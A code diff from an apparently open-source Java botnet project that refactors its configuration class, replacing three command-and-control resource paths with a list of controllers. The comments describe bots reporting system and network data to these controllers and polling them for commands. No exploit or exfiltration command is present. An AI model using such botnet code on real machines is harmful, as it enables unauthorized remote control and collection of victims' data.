@@ -26,6 +26,8 @@
 
 package com.acmutv.botnet.config;
 
+import com.acmutv.botnet.core.control.Controller;
+import com.acmutv.botnet.tool.string.TemplateEngine;
 import com.acmutv.botnet.tool.time.Duration;
 import com.acmutv.botnet.tool.time.Interval;
 import lombok.AllArgsConstructor;
@@ -33,6 +35,8 @@ import lombok.Data;
 import lombok.NoArgsConstructor;
 import org.yaml.snakeyaml.Yaml;
 
+import java.util.ArrayList;
+import java.util.List;
 import java.util.concurrent.TimeUnit;
 
 /**
@@ -73,19 +77,18 @@ public class AppConfiguration {
   public static final Duration SAMPLING = new Duration(1, TimeUnit.MINUTES);
 
   /**
-   * Default value for property initResource.
+   * Default value for property controllers
    */
-  public static final String INIT_RESOURCE = AppConfiguration.class.getResource("/cc/botinit.json").getPath();
-
-  /**
-   * Default value for property cmdResource.
-   */
-  public static final String CMD_RESOURCE = AppConfiguration.class.getResource("/cc/botcmd.json").getPath();
-
-  /**
-   * Default value for property logResource.
-   */
-  public static final String LOG_RESOURCE = AppConfiguration.class.getResource("/cc/botlog.json").getPath();
+  public static final List<Controller> CONTROLLERS = new ArrayList<>();
+  static {
+    CONTROLLERS.add(
+        new Controller(
+            TemplateEngine.getInstance().replace("${PWD}/cc/botinit.json"),
+            TemplateEngine.getInstance().replace("${PWD}/cc/botcmd.json"),
+            TemplateEngine.getInstance().replace("${PWD}/cc/botlog.json")
+        )
+    );
+  }
 
   /**
    * Default value for property polling.
@@ -94,28 +97,28 @@ public class AppConfiguration {
 
   /**
    * Property sysInfo.
-   * If true, the bot sends system information to the CC.
+   * If true, the bot sends system information to the CONTROLLERS.
    * Default is: true.
    */
   private boolean sysInfo = SYS_INFO;
 
   /**
    * Property netInfo.
-   * If true, the bot sends network information to the CC.
+   * If true, the bot sends network information to the CONTROLLERS.
    * Default is: true.
    */
   private boolean netInfo = NET_INFO;
 
   /**
    * Property sysStat.
-   * If true, the bot sends system statistics to the CC.
+   * If true, the bot sends system statistics to the CONTROLLERS.
    * Default is: true.
    */
   private boolean sysStat = SYS_STAT;
 
   /**
    * Property netStat.
-   * If true, the bot sends network statistics to the CC.
+   * If true, the bot sends network statistics to the CONTROLLERS.
    * Default is: true.
    */
   private boolean netStat = NET_STAT;
@@ -128,29 +131,14 @@ public class AppConfiguration {
   private Duration sampling = SAMPLING;
 
   /**
-   * Property initResource.
-   * The bot uses this resource to joinBotnet the botnet.
-   * Default is: ${PROJECT_RESOURCES}cc/botinit.json.
+   * Property controllers.
+   * The list of controllers to contact.
    */
-  private String initResource = INIT_RESOURCE;
-
-  /**
-   * Property cmdResource.
-   * The bot uses this resource to get commands to execute.
-   * Default is: ${PROJECT_RESOURCES}cc/botcmd.json.
-   */
-  private String cmdResource = CMD_RESOURCE;
-
-  /**
-   * Property logResource.
-   * The bot uses this resource to submit reports.
-   * Default is: ${PROJECT_RESOURCES}cc/botlog.json.
-   */
-  private String logResource = LOG_RESOURCE;
+  private List<Controller> controllers = CONTROLLERS;
 
   /**
    * Property polling.
-   * The bot polls CC for commands with a random period within this interval.
+   * The bot polls CONTROLLERS for commands with a random period within this interval.
    */
   private Interval polling = POLLING;
 
@@ -172,9 +160,7 @@ public class AppConfiguration {
     this.sysStat = other.sysStat;
     this.netStat = other.netStat;
     this.sampling = other.sampling;
-    this.initResource = other.initResource;
-    this.cmdResource = other.cmdResource;
-    this.logResource = other.logResource;
+    this.controllers = other.controllers;
     this.polling = other.polling;
   }
 
@@ -187,9 +173,7 @@ public class AppConfiguration {
     this.sysStat = SYS_STAT;
     this.netStat = NET_STAT;
     this.sampling = SAMPLING;
-    this.initResource = INIT_RESOURCE;
-    this.cmdResource = CMD_RESOURCE;
-    this.logResource = LOG_RESOURCE;
+    this.controllers = CONTROLLERS;
     this.polling = POLLING;
   }
 
